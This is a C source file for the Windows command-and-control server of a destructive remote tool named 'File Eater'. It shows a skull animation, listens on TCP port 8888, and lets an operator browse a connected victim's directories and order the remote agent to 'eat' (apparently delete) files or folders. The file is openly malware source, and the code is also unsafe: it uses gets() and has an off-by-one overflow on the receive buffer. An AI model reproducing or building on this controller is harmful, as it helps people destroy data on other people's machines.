#include<stdio.h>
#include<winsock2.h>
#include<string.h>


#pragma comment(lib,"ws2_32.lib") //Winsock Library

// Declaring needed variables globally
WSADATA wsa;
SOCKET s, new_socket;
struct sockaddr_in server, client;
int c, recv_size;
char buffer[2048], dirName[2048];;


// Repetitive code declared as functions here...

void error() {
		exit(1);
	}

void initWinSock() {
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("\nFailed. Error Code : %d",WSAGetLastError());
		error();
	}
}

void createAndBindSock() {

if((s = socket(AF_INET , SOCK_STREAM , IPPROTO_TCP )) == INVALID_SOCKET)
{
	printf("\n[!] Could not create socket : %d" , WSAGetLastError());
	error();
}

//Prepare the sockaddr_in structure
server.sin_family = AF_INET;
server.sin_addr.s_addr = INADDR_ANY;
server.sin_port = htons( 8888 );
	
	//Bind
	if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
	{
		printf("\nBind failed with error code : %d" , WSAGetLastError());
		error();
	}
}

void listenAndAcceptConn() {
	listen(s , 3);

	c = sizeof(struct sockaddr_in);
	new_socket = accept(s , (struct sockaddr *)&client, &c);
	if (new_socket == INVALID_SOCKET)
	{
		printf("\naccept failed with error code : %d" , WSAGetLastError());
		error();
	}

}

void reliableRecieve() {

	// Cleaning buffer before data comes.
	memset(buffer,0,strlen(buffer));

	if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
		printf("\n[!] Recieve Failed.");
	}

	buffer[recv_size] = '\0';
}

void reliableSend() {
	//Sending message to client
	send(new_socket , buffer , strlen(buffer) , 0);

}

void showAnimation() {
	system("cls");
	fprintf(stderr, "         _______________\n");
	fprintf(stderr, "        /               \\\n");
	fprintf(stderr, "       /                 \\\n");
	fprintf(stderr, "      /                   \\\n");
	fprintf(stderr, "      |   XXXX     XXXX   |\n");
	fprintf(stderr, "      |   XXXX     XXXX   |\n");
	fprintf(stderr, "      |   XXX       XXX   |\n");
	fprintf(stderr, "      |         X         |\n");
	fprintf(stderr, "      \\__      XXX     __/\n");
	fprintf(stderr, "        |\\     XXX     /|\n");
	fprintf(stderr, "        | |           | |\n");
	fprintf(stderr, "        | I I I I I I I |\n");
	fprintf(stderr, "        |  I I I I I I  |\n");
	fprintf(stderr, "         \\_           _/\n");
	fprintf(stderr, "          \\_         _/\n");
	fprintf(stderr, "            \\_______/\n");
	fprintf(stderr, "  XXX                        XXX\n");
	fprintf(stderr, "XXXXX                        XXXXX\n");
	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
	fprintf(stderr, "         XXXXX     XXXXX\n");
	fprintf(stderr, "             XXXXXXX\n");
	fprintf(stderr, "         XXXXX     XXXXX\n");
	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
	fprintf(stderr, "XXXXX                        XXXXX\n");
	fprintf(stderr, "  XXX                        XXX\n");
	Sleep(3000);

	system("color 70");

	int jawLength = 10;

	for (int i = 0; i < jawLength; i++) {
		system("cls");
		fprintf(stderr, "         _______________\n");
		fprintf(stderr, "        /               \\\n");
		fprintf(stderr, "       /                 \\\n");
		fprintf(stderr, "      /                   \\\n");
		fprintf(stderr, "      |   XXXX     XXXX   |\n");
		fprintf(stderr, "      |   X XX     XX X   |\n");
		fprintf(stderr, "      |   XXX       XXX   |\n");
		fprintf(stderr, "      |         X         |\n");
		fprintf(stderr, "      \\__      XXX     __/\n");
		fprintf(stderr, "        |\\     XXX     /|\n");
		fprintf(stderr, "        | I I I I I I I |\n");
		fprintf(stderr, "        |               |\n");
		for (int j = 0; j < i; j++) {
			fprintf(stderr, "        |               |\n");
		}
		fprintf(stderr, "        |               |\n");
		fprintf(stderr, "         \\I I I I I I _/\n");
		fprintf(stderr, "          \\_         _/\n");
		fprintf(stderr, "            \\_______/\n");
		fprintf(stderr, "  XXX                        XXX\n");
		fprintf(stderr, "XXXXX                        XXXXX\n");
		fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
		fprintf(stderr, "         XXXXX     XXXXX\n");
		fprintf(stderr, "             XXXXXXX\n");
		fprintf(stderr, "         XXXXX     XXXXX\n");
		fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
		fprintf(stderr, "XXXXX                        XXXXX\n");
		fprintf(stderr, "  XXX                        XXX\n");

		if (i % 2 == 0) {
			system("color 70");
		} else {
			system("color 07");
		}

		if (i < (int) jawLength / 2) {
			Sleep(20);
		} else {
			Sleep(10);
		}
	}
	
	system("color 07");
	system("cls");
	}

void writeToBuffer(char data[]) {
	// Clearing old data
	memset(buffer,0,strlen(buffer));

	// Putting new data
	strcpy(buffer, data);
}

int main(int argc , char *argv[])
{

	// Main Code
	showAnimation();
	
	system("cls");
	fprintf(stderr, "=====================================================\n");
	fprintf(stderr, "                   WELCOME TO FILE EATER\n");
	fprintf(stderr, "=====================================================\n");

	Sleep(100);

	fprintf(stderr, "\n");


	fprintf(stderr, "[+] Setting things up...\r");
	initWinSock();
	createAndBindSock();
	fprintf(stderr, "[+] Setting things up... Done.\n");


	fprintf(stderr, "[+] Listening for connections...\n");
	listenAndAcceptConn();
	fprintf(stderr, "[+] Connected.\n");

	int running = 1;

	while (running) {
		int choice = -1;
		fprintf(stderr, "\nThese are your options :-\n\n");
		fprintf(stderr, "[0] Quit.\n");
		fprintf(stderr, "[1] Get list of files in CWD.\n");
		fprintf(stderr, "[2] Get path of CWD.\n");
		fprintf(stderr, "[3] Go to a specific folder in CWD.\n");
		fprintf(stderr, "[4] Go to parent folder of CWD.\n");
		fprintf(stderr, "[5] Eat a file in CWD.\n");
		fprintf(stderr, "[6] Give Agent File Eater free hand.\n");
		fprintf(stderr, "[7] Ask Agent File Eater to wait for instructions.\n");


		fprintf(stderr, "\nYour selected option: ");
		fflush(stdin);
		scanf("%d", &choice);
		
		switch (choice) {
			case 0:
				running = 0;
				break;

			case 1:
				fprintf(stderr, "\n[+] Requesting client to send files data...");

				// Asking client to send directory data
				writeToBuffer(" 1");
				reliableSend();

				// Recieving direcory data
				reliableRecieve();
				fprintf(stderr, "\n[+] Recieved files data from client.");
				fprintf(stderr, "\n%s", buffer);

				break;

			case 2:
				fprintf(stderr, "\n[+] Requesting client to send current working directory...");

				// Asking client to send cwd
				writeToBuffer(" 2");
				reliableSend();

				// Recieving data
				reliableRecieve();
				fprintf(stderr, "\n[+] CWD is: ");
				fprintf(stderr, "\n%s", buffer);

				break;

			case 3:
				// Asking client to switch to a folder
				writeToBuffer(" 3");
				reliableSend();

				fprintf(stderr, "\n[+] Requesting client to go to specific directory...");

				// Sending folder name to client
				

				memset(buffer,0,strlen(dirName));
				
				fprintf(stderr, "\nEnter name of the directory you want to switch to: ");
				fflush(stdin);
				gets(dirName);

				writeToBuffer(dirName);
				reliableSend();

				// Recieving data
				reliableRecieve();
				fprintf(stderr, "\n[+] CWD changed to: ");
				fprintf(stderr, "\n%s", buffer);

				break;


			case 4:
				fprintf(stderr, "\n[+] Requesting client to go to parent directory...");

				// Asking client to send cwd
				writeToBuffer(" 4");
				reliableSend();

				// Recieving data
				reliableRecieve();
				fprintf(stderr, "\n[+] CWD changed to: ");
				fprintf(stderr, "\n%s", buffer);

				break;

			case 5:
				// Asking client to eat a folder
				writeToBuffer(" 5");
				reliableSend();

				fprintf(stderr, "\n[+] Requesting client to eat a specific directory...");

				// Sending folder name to client
				

				memset(buffer,0,strlen(dirName));
				
				fprintf(stderr, "\nEnter name of the directory you want to eat: ");
				fflush(stdin);
				gets(dirName);

				writeToBuffer(dirName);
				reliableSend();

				// Recieving data
				reliableRecieve();
				fprintf(stderr, "\n[+] File eater says:");
				fprintf(stderr, "\n%s", buffer);

				break;

			default:
				fprintf(stderr, "Incorrect Option Chosen.");
				break;
			


		}

		if (choice != 0){
			fflush(stdin);
			printf("\n\nPress any key to continue...");
			getchar();
			system("cls");
		}
	}
	// Not closing properly on purpose
	// closesocket(s);
	// closesocket(new_socket);

	return 0;
}